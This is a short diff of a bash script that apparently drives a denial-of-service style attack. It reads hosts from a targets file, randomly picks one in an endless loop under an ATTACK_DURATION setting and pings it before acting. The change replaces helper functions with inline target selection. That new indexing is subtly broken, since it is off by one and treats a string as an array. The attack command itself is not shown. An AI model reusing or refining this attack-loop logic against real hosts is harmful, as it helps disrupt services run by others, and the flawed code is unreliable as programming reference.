@@ -8,26 +8,17 @@ ATTACK_DURATION=60s
 TARGETS_FILE="targets.txt"
 targets=$(cat $TARGETS_FILE)
 
-echo "Targets:"
-echo $targets
-
-function select_target()
-{
-	CURRENT_TARGET=${targets[ $RANDOM % ${#targets[@]} ]}	
-}
-
-function get_target_hostname()
-{
-	CURRENT_HOST=$CURRENT_TARGET
-	CURRENT_HOST=$(echo "$CURRENT_HOST" | sed 's/http:\/\///')
-	CURRENT_HOST=$(echo "$CURRENT_HOST" | sed 's/https:\/\///')
-}
-
 while true
 do
 	echo "[DEBUG] Selecting target..."
-	select_target;
-	get_target_hostname;
+
+	len=${#targets[@]}
+	idx=$(shuf -i 1-$len -n 1)
+
+	CURRENT_TARGET=${targets[$idx]}
+	CURRENT_HOST=$CURRENT_TARGET
+	CURRENT_HOST=$(echo "$CURRENT_HOST" | sed 's/http:\/\///')
+	CURRENT_HOST=$(echo "$CURRENT_HOST" | sed 's/https:\/\///')
 
 	if ping $CURRENT_HOST -c $PING_COUNT -W $PING_TIMEOUT -q
 	then
